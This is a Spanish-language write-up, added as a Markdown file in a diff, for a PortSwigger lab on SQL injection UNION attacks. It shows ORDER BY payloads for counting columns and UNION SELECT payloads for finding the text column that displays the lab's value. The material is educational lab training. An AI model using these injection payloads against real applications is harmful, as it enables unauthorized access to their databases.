@@ -1,0 +1,79 @@
+---
+title: "#8 - SQL injection UNION attack, finding a column containing text"
+description: "Identificación de la columna compatible con datos tipo string mediante inyección UNION SELECT para mostrar un valor controlado en pantalla."
+date: "2026-07-13"
+tags: ["portswigger", "sql-injection", "union-based", "practitioner"]
+category: "sql-injection"
+difficulty: "PRACTITIONER"
+---
+
+**Laboratorio:** [Lab: SQL injection UNION attack, finding a column containing text | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
+
+- Objetivo:
+    - Determinar el número de columnas.
+    - Identificar la columna compatible con datos tipo `string`.
+    - Mostrar por pantalla el dato aleatorio.
+
+## **Análisis inicial**
+
+La aplicación presenta artículos filtrados por categoría a través de una consulta SQL vulnerable, lo que permite inyectar sentencias maliciosas.
+
+## Consulta original:
+
+```sql
+SELECT * FROM articles WHERE category = ''
+```
+
+La consulta filtra los artículos según la categoría proporcionada en la URL. Esta entrada es vulnerable y puede ser manipulada para ejecutar consultas arbitrarias mediante la cláusula `UNION`.
+
+## 🔎 Observación sobre UNION
+
+La inyección SQL basada en `UNION` permite combinar resultados de múltiples sentencias `SELECT` en una sola salida. Es útil cuando el atacante quiere recuperar datos adicionales de otras tablas, como versiones, usuarios, contraseñas, etc.
+
+## Solución
+
+- **Determinar el número de columnas**
+    
+    Antes de usar `UNION`, necesitamos saber cuántas columnas devuelve la consulta original. Para eso, se usa la técnica `ORDER BY`.
+    
+    **Payloads utilizados:**
+    
+    ```sql
+    ' ORDER BY 1--
+    ' ORDER BY 2--
+    ' ORDER BY 3-- 
+    ' ORDER BY 4-- <-Error
+    ```
+    
+    - Se incrementa el número hasta provocar un error.
+    - En este caso, `ORDER BY 4` falla, lo que indica que hay 3 **columnas**.
+    
+- **Validar la inyección `UNION`**
+Conociendo el número de columnas, se prueba un `UNION SELECT` para confirmar que la inyección funciona y encontrar qué columna permite insertar texto.
+    
+    **Payload de prueba:**
+    
+    ```sql
+    ' UNION SELECT 'abc', NULL, NULL-- <-Provoca error
+    
+    ' UNION SELECT NULL, 'abc', NULL--
+    
+    ' UNION SELECT NULL, NULL, 'abc'-- <-Provoca error
+    ```
+    
+    - La segunda columna permite insertar datos tipo `string`.
+
+- Mostrar el dato aleatorio por pantalla
+    
+    ```sql
+    ' UNION SELECT NULL, '166qrb', NULL--
+    ```
+    
+    Este valor aparece en la respuesta de la aplicación, cumpliendo el objetivo del laboratorio.
+    
+
+## ✅ Resultado
+
+Se logra mostrar en pantalla un valor controlado, confirmando la explotación exitosa de la vulnerabilidad:
+
+![Resultado de la inyección UNION mostrando el valor aleatorio insertado en la columna de texto](/writeups/portswigger/8_sql_injection_union_find_text_column/image.png)
